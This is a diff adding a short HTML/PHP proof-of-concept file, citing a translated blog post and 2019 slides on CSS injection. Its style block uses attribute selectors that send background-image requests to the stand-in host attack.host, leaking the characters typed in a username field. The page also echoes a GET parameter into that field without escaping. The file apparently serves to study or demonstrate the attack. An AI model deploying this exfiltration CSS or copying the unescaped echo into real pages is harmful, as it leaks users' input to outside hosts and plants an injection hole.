@@ -1,0 +1,17 @@
+#source :http://www.fwheart.club/2019/04/08/[%E8%AF%91]%E4%BD%BF%E7%94%A8CSS%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/
+#https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf
+
+<html>
+<head>
+    <style>
+        #username[value*="aa"]~#aa{background:url("https://attack.host/aa");}#username[value*="ab"]~#ab{background:url("https://attack.host/ab");}#username[value*="ac"]~#ac{background:url("https://attack.host/ac");}#username[value^="a"]~#a_{background:url("https://attack.host/a_");}#username[value$="a"]~#_a{background:url("https://attack.host/_a");}#username[value*="ba"]~#ba{background:url("https://attack.host/ba");}#username[value*="bb"]~#bb{background:url("https://attack.host/bb");}#username[value*="bc"]~#bc{background:url("https://attack.host/bc");}#username[value^="b"]~#b_{background:url("https://attack.host/b_");}#username[value$="b"]~#_b{background:url("https://attack.host/_b");}#username[value*="ca"]~#ca{background:url("https://attack.host/ca");}#username[value*="cb"]~#cb{background:url("https://attack.host/cb");}#username[value*="cc"]~#cc{background:url("https://attack.host/cc");}#username[value^="c"]~#c_{background:url("https://attack.host/c_");}#username[value$="c"]~#_c{background:url("https://attack.host/_c");}
+    </style>
+</head>
+<body>
+    <form>
+        Username: <input type="text" id="username" name="username" value="<?php echo $_GET['username']; ?>" />
+        <input id="form_submit" type="submit" value="submit"/>
+        <a id="aa"><a id="ab"><a id="ac"><a id="a_"><a id="_a"><a id="ba"><a id="bb"><a id="bc"><a id="b_"><a id="_b"><a id="ca"><a id="cb"><a id="cc"><a id="c_"><a id="_c">
+    </form>
+</body>
+</html>
